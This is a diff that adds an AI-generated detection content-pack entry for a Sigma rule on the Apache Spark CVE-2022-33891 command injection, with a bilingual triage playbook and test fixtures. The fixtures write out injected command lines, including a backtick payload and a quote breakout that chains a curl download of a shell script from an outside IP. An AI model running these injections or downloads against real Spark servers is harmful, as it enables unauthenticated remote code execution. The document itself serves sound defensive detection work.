@@ -1,0 +1,137 @@
+{
+  "rule": {
+    "id": "c8a5f584-cdc8-42cc-8cce-0398e4265de3",
+    "title": "Apache Spark Shell Command Injection - ProcessCreation",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "2022/Exploits/CVE-2022-33891/proc_creation_lnx_exploit_cve_2022_33891_spark_shell_command_injection.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules-emerging-threats/2022/Exploits/CVE-2022-33891/proc_creation_lnx_exploit_cve_2022_33891_spark_shell_command_injection.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1190"
+    ],
+    "folder": "rules-emerging-threats"
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso hijo de bash contiene en CommandLine el patrón \"id -Gn\" seguido de una comilla invertida o una comilla simple. Esto coincide con la explotación de CVE-2022-33891, una inyección de comandos en Apache Spark.",
+      "what_it_detects": "Detecta la creación de procesos en Linux cuyo ParentImage termina en \\bash y cuyo CommandLine contiene \"id -Gn `\" o \"id -Gn '\". Cuando las ACL están activas (spark.acls.enable), Spark UI pasa el parámetro doAs a \"id -Gn <usuario>\" en un shell, y el atacante inyecta comandos en ese parámetro. La descripción de la regla menciona CVE-2014-6287 por error; el tag correcto es cve.2022-33891.",
+      "why_it_matters": "Es explotación de una aplicación expuesta (T1190, acceso inicial): permite ejecutar comandos remotos sin autenticación con los privilegios del servicio Spark. A partir de ahí el atacante puede robar datos, instalar mineros o moverse lateralmente.",
+      "triage_steps": [
+        "Revise CommandLine completo y extraiga lo que va dentro de las comillas invertidas o después de la comilla simple: es el payload inyectado.",
+        "Reconstruya el árbol de procesos: ParentImage, el proceso java de Spark más arriba y todos los procesos hijos generados.",
+        "Revise los logs de acceso de Spark UI y del proxy en busca de peticiones con el parámetro doAs que contengan comillas invertidas, ';' o '|', y anote la IP de origen.",
+        "Busque en el mismo host, en una ventana de +/- 15 minutos, conexiones de red salientes, descargas (curl, wget), archivos nuevos en /tmp o /dev/shm y cambios en crontab.",
+        "Confirme la versión de Spark y si spark.acls.enable está activo; las versiones sin parche con ACL activas son vulnerables.",
+        "Busque la misma IP de origen y el mismo patrón en otros nodos de Spark, y revise alertas anteriores de este host."
+      ],
+      "false_positives": [
+        "La regla indica que los falsos positivos son poco probables.",
+        "Escáneres de vulnerabilidades o pruebas de penetración autorizadas que envían payloads benignos (por ejemplo whoami o touch) al parámetro doAs.",
+        "Scripts de administración que ejecutan id -Gn con argumentos entre comillas simples; valide el script y su origen."
+      ],
+      "response_steps": [
+        "Confirme si el payload se ejecutó revisando sus procesos hijos y sus efectos en el host; descarte primero una prueba autorizada.",
+        "Si hay explotación, aísle el nodo o limite el acceso a Spark UI y bloquee la IP de origen en el perímetro.",
+        "Preserve evidencia (lista de procesos, conexiones, logs de Spark) antes de terminar procesos o limpiar archivos.",
+        "Elimine la persistencia identificada y rote las credenciales y tokens accesibles para la cuenta del servicio Spark.",
+        "Actualice Apache Spark a una versión corregida según el aviso oficial y no exponga Spark UI a Internet.",
+        "Nota de tuning: ParentImage usa '\\bash' con barra invertida; valide que la regla coincida con rutas reales como /bin/bash."
+      ],
+      "severity_rationale": "El nivel high corresponde a un patrón muy específico de ejecución remota de comandos sin autenticación y con muy pocos usos legítimos."
+    },
+    "en": {
+      "summary": "A process spawned by bash has \"id -Gn\" in its CommandLine, followed by a backtick or a single quote. This matches exploitation of CVE-2022-33891, a command injection in Apache Spark.",
+      "what_it_detects": "Linux process creation where ParentImage ends with \\bash and CommandLine contains \"id -Gn `\" or \"id -Gn '\". When ACLs are enabled (spark.acls.enable), Spark UI passes the doAs parameter to \"id -Gn <user>\" in a shell, and an attacker injects commands through that parameter. The rule description cites CVE-2014-6287 by mistake; the tag cve.2022-33891 is correct.",
+      "why_it_matters": "This is exploitation of a public-facing application (T1190, initial access). It allows unauthenticated remote command execution as the Spark service account, which can lead to data theft, cryptomining or lateral movement.",
+      "triage_steps": [
+        "Read the full CommandLine and extract what sits inside the backticks or after the single quote: that is the injected payload.",
+        "Rebuild the process tree: ParentImage, the Spark java process above it and every child process spawned.",
+        "Check Spark UI and proxy access logs for requests whose doAs parameter contains backticks, ';' or '|', and note the source IP.",
+        "On the same host, within +/- 15 minutes, look for outbound connections, downloads (curl, wget), new files in /tmp or /dev/shm and crontab changes.",
+        "Confirm the Spark version and whether spark.acls.enable is set; unpatched versions with ACLs enabled are vulnerable.",
+        "Hunt for the same source IP and pattern on other Spark nodes, and review earlier alerts for this host."
+      ],
+      "false_positives": [
+        "The rule lists false positives as unlikely.",
+        "Authorized vulnerability scans or penetration tests sending benign payloads (for example whoami or touch) to the doAs parameter.",
+        "Admin scripts running id -Gn with single-quoted arguments; verify the script and where it came from."
+      ],
+      "response_steps": [
+        "Confirm whether the payload ran by reviewing its child processes and its effects on the host; rule out an authorized test first.",
+        "If exploitation is confirmed, isolate the node or restrict access to Spark UI, and block the source IP at the perimeter.",
+        "Preserve evidence (process list, connections, Spark logs) before killing processes or removing files.",
+        "Remove any persistence you find, and rotate credentials and tokens the Spark service account can reach.",
+        "Upgrade Apache Spark to a fixed release per the official advisory, and do not expose Spark UI to the Internet.",
+        "Tuning note: ParentImage uses '\\bash' with a backslash; check that the rule actually matches real paths such as /bin/bash."
+      ],
+      "severity_rationale": "High fits because this very specific pattern means unauthenticated remote command execution and has almost no legitimate use."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Backtick injection through the doAs parameter. ParentImage ends with a literal backslash before bash because the rule requires '\\bash'.",
+        "event": {
+          "Computer": "spark-master-01",
+          "User": "spark",
+          "ProcessId": 48213,
+          "ParentProcessId": 48190,
+          "Image": "/usr/bin/id",
+          "CommandLine": "id -Gn `touch /tmp/poc_marker`",
+          "ParentImage": "/usr/bin\\bash",
+          "ParentCommandLine": "bash -c id -Gn `touch /tmp/poc_marker`"
+        }
+      },
+      {
+        "description": "Single-quote breakout variant that chains a second command after id -Gn.",
+        "event": {
+          "Computer": "spark-worker-03",
+          "User": "spark",
+          "ProcessId": 51077,
+          "ParentProcessId": 51060,
+          "Image": "/usr/bin/bash",
+          "CommandLine": "bash -c id -Gn 'x';curl http://203.0.113.10/s.sh -o /tmp/s.sh;'",
+          "ParentImage": "/bin\\bash",
+          "ParentCommandLine": "bash -c id -Gn 'x';curl http://203.0.113.10/s.sh -o /tmp/s.sh;'"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate group lookup for a plain username: no backtick or single quote after id -Gn.",
+        "event": {
+          "Computer": "spark-master-01",
+          "User": "spark",
+          "ProcessId": 47002,
+          "ParentProcessId": 46990,
+          "Image": "/usr/bin/id",
+          "CommandLine": "id -Gn analyst01",
+          "ParentImage": "/usr/bin\\bash",
+          "ParentCommandLine": "bash -c id -Gn analyst01"
+        }
+      },
+      {
+        "description": "Injected command under a normal /bin/bash parent. It does not match because the rule's ParentImage needs a literal backslash, which shows the tuning gap.",
+        "event": {
+          "Computer": "spark-worker-02",
+          "User": "spark",
+          "ProcessId": 49120,
+          "ParentProcessId": 49101,
+          "Image": "/usr/bin/id",
+          "CommandLine": "id -Gn `whoami`",
+          "ParentImage": "/bin/bash",
+          "ParentCommandLine": "bash -c id -Gn `whoami`"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-30T20:31:11+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
